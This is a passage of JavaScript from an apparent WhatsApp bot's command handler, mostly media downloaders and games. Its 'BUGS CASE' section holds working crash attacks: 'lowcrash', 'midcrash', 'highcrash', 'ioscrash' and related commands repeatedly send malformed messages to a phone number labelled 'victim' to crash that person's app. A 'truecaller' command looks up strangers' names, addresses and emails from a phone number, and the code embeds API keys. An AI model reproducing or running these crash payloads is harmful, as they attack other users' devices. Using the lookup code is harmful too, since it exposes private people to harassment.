  } else if (args[0] === "jpg") {
    Venox.sendMessage(from, { image: { url: args[1] }, caption: 'Here it is...' }, { quoted: m })
  } else {
    reply("Error! ")
  }
}
break;
//----------------------------------------------------------------------------------
case 'mp4': {
  if (isBan || isBanChat) return reply(isBan ? mess.banned : mess.bangc);
  if (!args[0]) return reply(`Please provide a link!`);
  try {
    Venox.sendMessage(from, {
      video: { url: args[0] }, caption: "Success!", contextInfo: {
        externalAdreply: {
          title: global.botname,
          body: global.ownername,
          thumbnail: thumb,
          mediaType: 2,
          mediaUrl: global.link,
          sourceUrl: global.link
        }
      }
    }, { quoted: m });
  } catch {
    reply("Link error!");
  }
}
break;
//----------------------------------------------------------------------------------
case 'jpeg': {
  if (isBan || isBanChat) return reply(isBan ? mess.banned : mess.bangc);
  if (!args[0]) return reply(`Please provide a link!`);
  try {
    Venox.sendMessage(from, { image: { url: args[0] }, caption: "Success!" }, { quoted: m });
  } catch {
    reply("Link error");
  }
}
break;
//----------------------------------------------------------------------------------
case 'igtv': {
  if (isBan || isBanChat) return reply(isBan ? mess.banned : mess.bangc);
  if (!text) return reply(`Please provide a link!`);
  const { instagramdlv3 } = require('@bochilteam/scraper');
  if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply('*Invalid link!*');
  instagramdlv3(text).then(async (data) => {
    const buf = await getBuffer(data[0].thumbnail);
    Venox.sendMessage(m.chat, { video: { url: data[0].url }, jpegThumbnail: buf, caption: `${botname}` }, { quoted: m });
  }).catch(() => {
    reply(mess.error);
  });
}
break;
//----------------------------------------------------------------------------------
case 'twitter':
case 'td':
case 'twitterdl': {
  if (isBan || isBanChat) return reply(isBan ? mess.banned : mess.bangc);
  if (!text) return reply(`Please provide a link!`);
  if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(`*Invalid link!*`);
  xfarrapi.Twitter(text).then(async (data) => {
    const txt = `「 _Twitter Downloader_ 」\n\n*Title :* ${data.title}\n*Quality :* ${data.medias[1].quality}\n*Type :* ${data.medias[1].extension}\n*Size :* ${data.medias[1].formattedSize}\n*Duration :* ${data.medias.length}\n*URL :* ${data.url}\n\n*${botname}*`;
    const buf = await getBuffer(data.thumbnail);
    Venox.sendMessage(m.chat, { image: { url: data.thumbnail }, jpegThumbnail: buf, caption: txt }, { quoted: m });
    for (const i of data.medias) {
      Venox.sendMessage(m.chat, { video: { url: i.url }, jpegThumbnail: buf, caption: `*${text}*` }, { quoted: m });
    }
  }).catch(() => {
    reply(mess.error);
  });
}
break;
//----------------------------------------------------------------------------------
case 'twittermp3': case 'twitteraudio': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!text) return reply(`Please provide link!`)

        if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(`*Invalid link!*`)
        xfarrapi.Twitter(`${text}`).then(async (data) => {
          Venox.sendMessage(m.chat, { audio: { url: data.medias[1].url }, mimetype: 'audio/mp4' }, { quoted: m })
        }).catch((err) => {	
          reply(mess.reply)
        })
      }    
      break;
//----------------------------------------------------------------------------------
case 'igdl':
case 'instagram':
case 'instagramreels':
case 'igreels':
  if (isBan) return reply(mess.banned);
  if (isBanChat) return reply(mess.bangc);
  Venox.sendMessage(from, { react: { text: "🪄", key: m.key } });

  if (!text) return reply(`Where is the link?\n\nExample: ${prefix + command} https://www.instagram.com/reel/Ctjt0srIQFg/?igshid=MzRlODBiNWFlZA==`);

  try {
    let instadownload = await instadl(text);
    await Venox.sendMessage(m.chat, { video: { url: instadownload.url[0].url }, caption: mess.done }, { quoted: m });
  } catch (error) {
    console.error('Error while processing Instagram video:', error);
    return reply('An error occurred while processing the Instagram video.');
  }
  break;
//----------------------------------------------------------------------------------
case 'ytmp4':
case 'ytvideo': {
    const vidoh = require('./lib/ytdl2');
    if (args.length < 1 || !isUrl(text) || !vidoh.isYTUrl(text)) 
        irisreply(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`);
    
    const vid = await vidoh.mp4(text);
    const ytc = `*🌈 Tittle:* ${vid.title}\n\n*🎁 Date:* ${vid.date}\n\n*✨ Duration:* ${vid.duration}\n\n*🚩 Quality:* ${vid.quality}`;
    
    await Venox.sendMessage(m.chat, {
        video: { url: vid.videoUrl },
        caption: ytc
    }, { quoted: m });
}
break;
//----------------------------------------------------------------------------------
 case 'earthquake':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Venox.sendMessage(from, { react: { text: "⌛", key: m.key } })

        const tres = await Gempa()
        var { Waktu, Lintang, Bujur, Magnitude, Kedalaman, Wilayah, Map } = tres.result
        console.log(Map)
        const captt = `Time : ${Waktu}\nLatitude : ${Lintang}\nLongitude : ${Bujur}\nRegion : ${Wilayah}`
        Venox.sendMessage(from, { image: { url: Map }, caption: captt })
        break;
//----------------------------------------------------------------------------------
case 'covidinfo':
case 'covid':
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Venox.sendMessage(from, { react: { text: "⌛", key: m.key } })

        const c = await covid()
        var { cases, death, healed } = c[0]
        Venox.sendMessage(from, { text: `\nCovid India \n\nCase : ${cases}\n\nDead : ${death}\n\nHealed : ${healed}\n` }, m)
        break;
//----------------------------------------------------------------------------------
case 'spotify': {
    if (isBan || isBanChat) return reply(isBan ? mess.banned : mess.bangc);
    Venox.sendMessage(from, { react: { text: "🍁", key: m.key } });
    if (!q) return irisreply(`Please provide a query. Example: ${prefix + command} 295`);
    const abuffer = `https://www.guruapi.tech/api/spotifydl?url=${encodeURIComponent(q)}`;
    const bbuffer = await fetchJson(`https://www.guruapi.tech/api/spotifyinfo?text=${encodeURIComponent(q)}`);
    const { thumbnail, title, url } = bbuffer.spty.results;
    await Venox.sendMessage(from, { audio: { url: abuffer }, ptt: true, filename: 'error.mp3', mimetype: 'audio/mpeg', contextInfo: { mentionedJid: [m.sender], externalAdReply: { title: "↺ |◁   II   ▷|   ♡", body: `Now playing: ${title}`, thumbnailUrl: thumbnail, sourceUrl: url, mediaType: 1, renderLargerThumbnail: true } } }, { quoted: m });
}
break;
//----------------------------------------------------------------------------------
case 'lyrics': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.group);
        Venox.sendMessage(from, { react: { text: "🍁", key: m.key } })
        if (!text) return reply(`Command usage: ${prefix}lyrics Thunder`)
        reply(mess.wait)
        const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
        const result = await lyricsv2(text).catch(async _ => await lyrics(text))
        reply(`
*Title :* ${result.title}
*Author :* ${result.author}
*Url :* ${result.link}

*Lyrics :* ${result.lyrics}

`.trim())
      }
break;
//----------------------------------------------------------------------------------
case 'fbmp3': case 'facebookmp3': case 'facebookaudio': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!text) return irisreply(`Please provide the link!\n\nExample: ${prefix + command} https://www.facebook.com/groups/599913174599515/permalink/705467384044093/`)
        if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return irisreply(`Invalid link!`)
        let noh = require('@bochilteam/scraper')
        noh.savefrom(`${text}`).then(async (anu) => {
          Venox.sendMessage(m.chat, { audio: { url: anu.url[0].url }, mimetype: 'audio/mp4' }, { quoted: m })
        }).catch((err) => {
          reply(mess.error)
        })
}
break;
//----------------------------------------------------------------------------------
 case 'tiktoknowm': case 'ttnowm': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!q) return reply('Please provide the link !')
        reply(mess.wait)
        if (!q.includes('tiktok')) return reply(`That's not a tiktok link!`)
        const musim_rambutan = await VenoxTiktok(`${q}`).catch(e => {
          reply(mess.error)
        })
        console.log(musim_rambutan)
        const Venoxtiktoknowm = musim_rambutan.result.nowatermark
        Venox.sendMessage(from, { video: { url: Venoxtiktoknowm }, caption: "Here it is..." }, { quoted: m })
}
break;
//----------------------------------------------------------------------------------
case 'couplepp':
case 'cpp':
case 'ppcouple': {
    if (isBan || isBanChat) return reply(isBan ? mess.banned : mess.bangc);
    Venox.sendMessage(from, { react: { text: "🙀", key: m.key } });
    reply(mess.wait);
    const anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json');
    for (let i = 0; i < 3; i++) {
        const random = anu[Math.floor(Math.random() * anu.length)];
        await Venox.sendMessage(m.chat, { image: { url: random.male }, caption: `For him...` }, { quoted: m });
        await Venox.sendMessage(m.chat, { image: { url: random.female }, caption: `For her...` }, { quoted: m });
    }
}
break;
//----------------------------------------------------------------------------------
case 'coffee':
case 'kopi': {
    if (isBan || isBanChat) return reply(isBan ? mess.banned : mess.bangc);
    Venox.sendMessage(from, { react: { text: "🫡", key: m.key } });
    const buttonMessage = {
        image: { url: 'https://coffee.alexflipnote.dev/random' },
        caption: `Here is your Coffee...`,
    };
    Venox.sendMessage(m.chat, buttonMessage, { quoted: m });
}
break;
//----------------------------------------------------------------------------------
case "cry":
case "kill":
case "hug":
case "pat":
case "lick":
case "kiss":
case "bite":
case "yeet":
case "bully":
case "bonk":
case "wink":
case "poke":
case "nom":
case "slap":
case "smile":
case "wave":
case "awoo":
case "blush":
case "smug":
case "glomp":
case "happy":
case "dance":
case "cringe":
case "cuddle":
case "highfive":
case "shinobu":
case "handhold": {
    axios
        .get(`https://api.waifu.pics/sfw/${command}`)
        .then(({ data }) => {
            Venox.sendImageAsSticker(from, data.url, m, {
                packname: global.packname,
                author: global.author,
            });
        });
}
break;
//----------------------------------------------------------------------------------
case "woof":
case "8ball":
case "goose":
case "gecg":
case "feed":
case "avatar":
case "fox_girl":
case "lizard":
case "spank":
case "meow":
case "tickle": {
    axios
        .get(`https://nekos.life/api/v2/img/${command}`)
        .then(({ data }) => {
            Venox.sendImageAsSticker(from, data.url, m, {
                packname: global.packname,
                author: global.author,
            });
        });
}
break;
//----------------------------------------------------------------------------------
case "stupidcheck":
case "uncleancheck":
case "hotcheck":
case "smartcheck":
case "evilcheck":
case "dogcheck":
case "coolcheck":
case "waifucheck":
case "handsomecheck":
case "beautifulcheck":
case "awesomecheck":
case "greatcheck":
case "gaycheck":
case "cutecheck":
case "lesbiancheck":
case "hornycheck":
case "prettycheck":
case "lovelycheck":
case "uglycheck": {
    if (!m.isGroup) return reply(mess.group);
    const cex = body.slice(0);
    const cek2 = getRandomNumber(0, 100);
    const mention = mentionByReply ? mentionByReply : (mentionByTag[0] && isGroup ? mentionByTag[0] : sender);
    const checker = mention ? `@${mention.split("@")[0]}` : `@${sender.split("@")[0]}`;
    Venox.sendMessage(from, {
        text: "Question : *" + cex + "*\nChecker : " + checker + "\nAnswer : " + cek2 + "%",
        mentions: [mention],
    }, { quoted: m });
}
break;
//----------------------------------------------------------------------------------
case 'ghstalk': case 'githubstalk': case 'github': {
  if (isBan || isBanChat) return reply(isBan ? mess.banned : mess.bangc);
	
  Venox.sendMessage(from, { react: { text: "🔍", key: m.key } });

  if (!q) return reply(`Provide a username like *${prefix}github SuhailTechInfo*`);

  gitdata = await githubstalk.githubstalk(`${q}`);

  Venox.sendMessage(m.chat, { image: { url: gitdata.profile_pic }, caption: `*Github Info*\n\n🚩 Id: ${gitdata.id}\n🔖 Nickname: ${gitdata.nickname}\n🔖 Username: ${gitdata.username}\n✨ Bio: ${gitdata.bio}\n🏢 Company: ${gitdata.company}\n📍 Location: ${gitdata.location}\n📧 Email: ${gitdata.email}\n🔓 Public Repo: ${gitdata.public_repo}\n🔐 Public Gists: ${gitdata.public_gists}\n💕 Followers: ${gitdata.followers}\n👉 Following: ${gitdata.following}` }, { quoted: m });
}
break;
//----------------------------------------------------------------------------------
case 'git':
case 'gitclone':
case 'git-clone':
  if (isBan) return reply(mess.banned);
  if (isBanChat) return reply(mess.bangc);
  Venox.sendMessage(from, { react: { text: "💫", key: m.key } });

  if (!args[0]) return reply(`Provide the GitHub repository link.\nExample: ${prefix}${command} https://github.com/V-E-N-O-X/IRIS-MD`);
  if (!isUrl(args[0]) || !args[0].includes('github.com')) return reply(`Invalid or non-GitHub repository link provided. Use a valid GitHub repository link.`);

  try {
    let splitURL = args[0].split('github.com/');
    if (splitURL.length < 2) throw Error('Invalid GitHub URL');

    let [githubUser, githubRepo] = splitURL[1].split('/');
    githubRepo = githubRepo.replace('.git', '');

    let gitZipUrl = `https://api.github.com/repos/${githubUser}/${githubRepo}/zipball`;

    await Venox.sendMessage(from, { text: `${pushname}, Please wait, downloading...` });

    let zipHeaders = await fetch(gitZipUrl, { method: 'HEAD' }).then(res => res.headers);
    let zipFilename = zipHeaders.get('content-disposition').match(/attachment; filename=(.*)/)[1];

    await Venox.sendMessage(m.chat, { document: { url: gitZipUrl }, fileName: zipFilename + '.zip', mimetype: 'application/zip' }, { quoted: m });
  } catch (err) {
    console.error(err);
    return reply(`Failed to fetch the repository contents. Please ensure the GitHub link is correct and accessible. Use the format: 'https://github.com/username/repository'.`);
  }
  break;
//----------------------------------------------------------------------------------
 case 'soulmate': {
	 
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(`${mess.group}`);
        Venox.sendMessage(from, { react: { text: "🌝", key: m.key } });

        let member = participants.map(u => u.id);
        let me = m.sender;
        let jodoh = member[Math.floor(Math.random() * member.length)];

        let message = `👫 Be me Soulmate...\n@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`;
        Venox.sendMessage(m.chat, { text: message, mentions: [me, jodoh] }, { quoted: m });
      }
        break;
//----------------------------------------------------------------------------------
 case 'dare':
        if (isBan || isBanChat) return reply(isBan ? mess.banned : mess.bangc);
        Venox.sendMessage(from, { react: { text: "🌝", key: m.key } })

        const dare = [
	  "Send a voice note confessing your wildest fantasy to your crush.",
          "Write 'I'm feeling dangerously adventurous' as your WhatsApp status for the next 24 hours.",
          "Send a flirty message to your ex and see how they respond.",
          "Take a seductive selfie and send it to your significant other with the caption 'Wish you were here.'",
          "Text your crush asking them to describe their ideal date night in explicit detail.",
          "Change your Instagram bio to 'Certified heartbreaker' for the rest of the day.",
          "Send a suggestive emoji to someone you're interested in and see how they react.",
          "Post a bold selfie on your story with the caption 'Feeling fearless and fabulous.'",
          "Send a voice note describing your favorite fantasy in vivid detail.",
          "Write a steamy paragraph about your celebrity crush and post it on your Twitter.",
          "Text your crush saying 'I've been thinking about you... a lot' and wait for their response.",
          "Record yourself whispering something naughty and send it to your significant other.",
          "Send a flirtatious meme to your crush and see if they pick up on the hint.",
          "Change your Facebook relationship status to 'It's complicated' and watch the reactions roll in.",
          "Post a picture of yourself wearing your sexiest outfit on your Snapchat story."
        ]
        const daree = dare[Math.floor(Math.random() * dare.length)]
        buffer = await getBuffer(`https://images4.alphacoders.com/101/1016619.jpg`)
        Venox.sendMessage(from, { image: buffer, caption: '```You have chosen a Dare!```\n\n' + daree }, { quoted: m })
        break;
//----------------------------------------------------------------------------------
case 'truth':
        if (isBan || isBanChat) return reply(isBan ? mess.banned : mess.bangc);
        Venox.sendMessage(from, { react: { text: "🌝", key: m.key } })

        const truth = [
          "What's the craziest thing you've ever done on a dare?",
          "Have you ever had a secret crush on a friend's partner?",
          "What's the most embarrassing thing you've done while under the influence?",
          "Have you ever cheated on a test or exam? If yes, spill the details!",
          "What's the weirdest dream you've ever had?",
          "Have you ever stalked your crush on social media? What's the juiciest thing you found?",
          "What's the most ridiculous lie you've ever told to get out of trouble?",
          "Have you ever had a romantic dream about someone you shouldn't have?",
          "What's the most inappropriate time you've laughed?",
          "Have you ever pretended to like a gift you hated? What was it?",
          "What's the most embarrassing thing your parents have caught you doing?",
          "Have you ever sent a text to the wrong person that you wish you could take back?",
          "What's the most awkward encounter you've had with an ex?",
          "Have you ever been caught doing something you shouldn't have been doing?",
          "What's the most embarrassing nickname you've ever had?"
        ]
        const truthhh = truth[Math.floor(Math.random() * truth.length)]
        buffer = await getBuffer(`https://images2.alphacoders.com/650/650812.jpg`)
        Venox.sendMessage(from, { image: buffer, caption: '```You have chosen Truth...!```\n' + truthhh }, { quoted: m })
        break;
//----------------------------------------------------------------------------------
case 'anime': {
    if (isBan) return reply(mess.banned);
    if (isBanChat) return reply(mess.bangc);
    if (!m.isGroup) return reply(mess.group);
    if (!text) return reply(`Please provide a search term!\n\n*Example:* ${prefix}anime naruto`);

    const malScraper = require('mal-scraper');
    reply(mess.wait);
    
    const anime = await malScraper.getInfoFromName(text).catch(() => null);
    if (!anime) return reply(`Could not find your search.`);
    
    const animetxt = `
🎀 *Title: ${anime.title}*
🎋 *Type: ${anime.type}*
🎐 *Premiered on: ${anime.premiered}*
💠 *Total Episodes: ${anime.episodes}*
📈 *Status: ${anime.status}*
💮 *Genres: ${anime.genres}*
📍 *Studio: ${anime.studios}*
🌟 *Score: ${anime.score}*
💎 *Rating: ${anime.rating}*
🏅 *Rank: ${anime.ranked}*
💫 *Popularity: ${anime.popularity}*
♦️ *Trailer: ${anime.trailer}*
🌐 *URL: ${anime.url}*
❄ *Description:* ${anime.synopsis}*
`;
    await Venox.sendMessage(m.chat, { image: { url: anime.picture }, caption: animetxt }, { quoted: m });
}
break;
//----------------------------------------------------------------------------------
case 'manga':
    if (isBan) return reply(mess.banned);
    if (isBanChat) return reply(mess.bangc);
    if (!m.isGroup) return reply(mess.group);
    
    Venox.sendMessage(from, { react: { text: "🍁", key: m.key } });
    reply(mess.wait);

    const { Manga } = require("@shineiichijo/marika");
    const manga = new Manga();

    if (!q) return reply(`Please provide a search term!\n\n_Example:_ ${prefix}manga naruto`);

    let srh = await manga.searchManga(q);
    let mang = `*Title:* ${srh.data[0].title}\n`;
    mang += `*Status:* ${srh.data[0].status}\n`;
    mang += `*Total Volumes:* ${srh.data[0].volumes}\n`;
    mang += `*Total Chapters:* ${srh.data[0].chapters}\n`;
    mang += `*Genres:*\n`;
    
    for (let i = 0; i < srh.data[0].genres.length; i++) {
        mang += `\t\t\t\t\t\t\t\t${srh.data[0].genres[i].name}\n`;
    }
    
    mang += `*Published on:* ${srh.data[0].published.from}\n`;
    mang += `*Score:* ${srh.data[0].scored}\n`;
    mang += `*Popularity:* ${srh.data[0].popularity}\n`;
    mang += `*Favorites:* ${srh.data[0].favorites}\n`;
    mang += `*Authors:*\n`;
    
    for (let i = 0; i < srh.data[0].authors.length; i++) {
        mang += `\t\t\t\t\t\t\t\t\t${srh.data[0].authors[i].name} (${srh.data[0].authors[0].type})\n`;
    }
    
    mang += `\n*URL:* ${srh.data[0].url}\n\n`;
    
    if (srh.data[0].background !== null)
        mang += `*Background:* ${srh.data[0].background}`;
    
    mang += `*Description:* ${srh.data[0].synopsis.replace(/\[Written by MAL Rewrite]/g, "")}`;
    
    Venox.sendMessage(m.chat, { image: { url: srh.data[0].images.jpg.large_image_url }, caption: mang }, { quoted: m });
    break;
//----------------------------------------------------------------------------------
case 'waifu':
    if (isBan) return reply(mess.banned);
    if (isBanChat) return reply(mess.bangc);
    if (!m.isGroup) return reply(mess.group);
    
    reply(mess.wait);

    try {
        const waifuddd = await axios.get('https://waifu.pics/api/sfw/waifu');
        const button4Messagess = {
            image: { url: waifuddd.data.url },
            caption: 'More than one waifu will definitely ruin your Laifu!'
        };
        
        await Venox.sendMessage(m.chat, button4Messagess, { quoted: m });
    } catch (err) {
        console.error(err);
        reply('Error occurred while fetching the waifu.');
    }
    break;
//----------------------------------------------------------------------------------
case 'neko':
    if (isBan) return reply(mess.banned);
    if (isBanChat) return reply(mess.bangc);
    if (!m.isGroup) return reply(mess.group);
    
    reply(mess.wait);

    try {
        const waifuddd = await axios.get('https://waifu.pics/api/sfw/neko');
        const buttonMessagessf = {
            image: { url: waifuddd.data.url },
            caption: 'bwayiiii...'
        };

        await Venox.sendMessage(m.chat, buttonMessagessf, { quoted: m });
    } catch (err) {
        console.error(err);
        reply('Error occurred while fetching the neko.');
    }
    break;
//----------------------------------------------------------------------------------
case 'loli':
    if (isBan) return reply(mess.banned);
    if (isBanChat) return reply(mess.bangc);
    if (!m.isGroup) return reply(mess.group);
    
    reply(mess.wait);

    try {
        const waifuddd = await axios.get('https://waifu.pics/api/sfw/shinobu');
        const buttonMessagessfgr = {
            image: { url: waifuddd.data.url },
            caption: "Don't be a lolicon!"
        };

        await Venox.sendMessage(m.chat, buttonMessagessfgr, { quoted: m });
    } catch (err) {
        console.error(err);
        reply('Error occurred while fetching the loli.');
    }
    break;
//----------------------------------------------------------------------------------
case 'imdb':
case 'movie':
    if (isBan) return m.reply(mess.banned);
    if (isBanChat) return m.reply(mess.bangc);
    if (!text) return m.reply(`Give me a series or movie name.`);

    try {
        const fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`);
        console.log(fids.data);

        let imdbt = "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + "```IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n";
        imdbt += "🎬 Title      : " + fids.data.Title + "\n";
        imdbt += "📅 Year       : " + fids.data.Year + "\n";
        imdbt += "⭐ Rated      : " + fids.data.Rated + "\n";
        imdbt += "📆 Released   : " + fids.data.Released + "\n";
        imdbt += "⏳ Runtime    : " + fids.data.Runtime + "\n";
        imdbt += "🌀 Genre      : " + fids.data.Genre + "\n";
        imdbt += "👨🏻‍💻 Director : " + fids.data.Director + "\n";
        imdbt += "✍ Writer     : " + fids.data.Writer + "\n";
        imdbt += "👨 Actors     : " + fids.data.Actors + "\n";
        imdbt += "📃 Plot       : " + fids.data.Plot + "\n";
        imdbt += "🌐 Language   : " + fids.data.Language + "\n";
        imdbt += "🌍 Country    : " + fids.data.Country + "\n";
        imdbt += "🎖️ Awards     : " + fids.data.Awards + "\n";
        imdbt += "📦 BoxOffice  : " + fids.data.BoxOffice + "\n";
        imdbt += "🏙️ Production : " + fids.data.Production + "\n";
        imdbt += "🌟 imdbRating : " + fids.data.imdbRating + "\n";
        imdbt += "✅ imdbVotes  : " + fids.data.imdbVotes + "";

        Venox.sendMessage(m.chat, {
            image: {
                url: fids.data.Poster
            },
            caption: imdbt
        }, {
            quoted: m
        });
    } catch (err) {
        console.error(err);
        m.reply('Error occurred while fetching the movie details.');
    }
    break;
//----------------------------------------------------------------------------------
case 'true':
case 'truecaller':
  try {
    if (isBan) return reply(mess.banned);
    if (isBanChat) return reply(mess.bangc);
    if (!text) return reply('Please provide a phone number.');
    const installationId = 'a1i05--log7Ae-hk9y85780NEfKnif3z77XFt4zZn7Bi10zGXS0qVduxj7CRHxQw';
    const apiUrl = `https://sid-bhai.vercel.app/api/truecaller?phone=${encodeURIComponent(text)}&id=${installationId}`;
    let response = await axios.get(apiUrl);
    let json = response.data;
    const { name, alternateName, addresses, email, countryDetails } = json;
    let info = `╭───『 *Phone Detail* 』\n`;
    info += `┆ ⚝ *Name:* ${name}\n`;
    if (addresses && addresses.length > 0) {
      const address = addresses[0];
      info += `┆ ⚝ *Address:* ${address.city}, ${address.countryCode}\n`;
      info += `┆ ⚝ *Time Zone:* ${address.timeZone}\n`;
      info += `┆ ⚝ *Pin Code:* ${address.zipCode}\n`;
      info += `┆ ⚝ *Street:* ${address.street}\n`;
    }
    info += `┆ ⚝ *Email:* ${email}\n`;
    info += `╰───────༻\n`;
    if (countryDetails) {
      info += `╭───『 *Country Details* 』\n`;
      const { name, native, phone, continent, capital, currency, languages, flag } = countryDetails;
      info += `┆ ⚝ *Name:* ${name}\n`;
      info += `┆ ⚝ *Native:* ${native}\n`;
      info += `┆ ⚝ *Phone Code:* +${phone[0]}\n`;
      info += `┆ ⚝ *Continent:* ${continent}\n`;
      info += `┆ ⚝ *Capital:* ${capital}\n`;
      info += `┆ ⚝ *Currency:* ${currency.join(', ')}\n`;
      info += `┆ ⚝ *Languages:* ${languages.join(', ')}\n`;
      info += `┆ ⚝ *Flag:* ${flag}\n`;
      info += `╰───────༻\n`;
    }
    await Venox.sendMessage(m.chat, {
      text: info,
    }, {
      quoted: m,
    });

  } catch (error) {
    console.error(error);
  }
  break;
//-------------------------------< BUGS CASE >----------------------------------
case 'clearchat':
venoxium('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
break;
//-------------------------------< BUGS CASE >----------------------------------
case 'lowcrash':{
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 8880xxxxxxx`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "10"
for (let i = 0; i < amount; i++) {
Venox.relayMessage(from,{extendedTextMessage:{"text":'.',"contextInfo":{"stanzaId":victim,"participant":victim,"quotedMessage":{"conversation":venoxtext1},"disappearingMode":{"initiator":"CHANGED_IN_CHAT","trigger":"CHAT_SETTING"}},"inviteLinkGroupTypeV2":"DEFAULT"}},{messageId:null})}
irisreply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes else ur acc can get banned*`)
}
break;
//-------------------------------< BUGS CASE >----------------------------------
case 'midcrash':{
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 880xxxxxxxxx`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "100"
for (let i = 0; i < amount; i++) {
BugWars(pushname,victim)
await sleep(3000)}
irisreply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break;
//-------------------------------< BUGS CASE >----------------------------------
case 'highcrash': {
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
const buggy = `${venoxtext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Dhaka").format("DD/MM/YYYY HH:mm:ss")}`,
"title": buggy,
}
}), { userJid: from, quoted : m})
Venox.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
irisreply(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
}
break;
//-------------------------------< BUGS CASE >----------------------------------
case 'iosgoogle':{
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 880xxxxxxxx`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "10"
for (let i = 0; i < amount; i++) {
Venox.sendMessage(victim,{text:`https://google.com`,contextInfo:{externalAdReply:{renderLargerThumbnail:true,mediaType:1,title:venoxtext1,body:`###############################`,thumbnail:await getBuffer('https://logopng.com.br/logos/google-37.svg'),jpegThumbnail:await getBuffer('https://logopng.com.br/logos/google-37.svg'),previewType:"NONE",sourceUrl:link}}})}
irisreply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break;
//-------------------------------< BUGS CASE >----------------------------------
case 'iosgooglev2':{
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
Venox.sendMessage(m.chat,{text:`https://google.com`,contextInfo:{externalAdReply:{renderLargerThumbnail:true,mediaType:1,title:venoxtext1,body:`###############################`,thumbnail:await getBuffer('https://logopng.com.br/logos/google-37.svg'),jpegThumbnail:await getBuffer('https://logopng.com.br/logos/google-37.svg'),previewType:"NONE",sourceUrl:link}}})}
irisreply(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
}
break;
//-------------------------------< BUGS CASE >----------------------------------
case 'ioscrash':{
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 880xxxxxxxx`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "10"
for (let i = 0; i < amount; i++) {
Venox.relayMessage(victim,{"paymentInviteMessage":{serviceType:"UPI",expiryTimestamp:Date.now()+(24*60*60*1000)}},{})
await sleep(3000)}
irisreply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break;
//-------------------------------< BUGS CASE >----------------------------------
case 'xioscrashv2':{
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
Venox.relayMessage(m.chat,{"paymentInviteMessage":{serviceType:"UPI",expiryTimestamp:Date.now()+(24*60*60*1000)}},{})
await sleep(3000)}
irisreply(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
}
break;
//-------------------------------< BUGS CASE >----------------------------------
case 'kickall': {
  if (!m.isGroup) return reply(mess.group)
  if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.owner)
  if (!isBotAdmins) return reply(mess.botAdmin)

  const keckall = (args[0] === 'numBut')
    ? text.replace(`${args[0]} `, '').split('|')
    : (Number(args[0]))
      ? groupMetadata.participants
        .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
        .map(item => item.id)
      : groupMetadata.participants
        .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
        .map(item => item.id);
  
  if (global.welcome === true) {
    welcome = false;
  }
  
  for (let remove of keckall) {
    await Venox.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${remove}@s.whatsapp.net` : remove], "remove");
    await sleep(100);
  }
  
  irisreply(`Success`);
}
break;
//-------------------------------< BUGS CASE >----------------------------------
 case 'promoteall': {
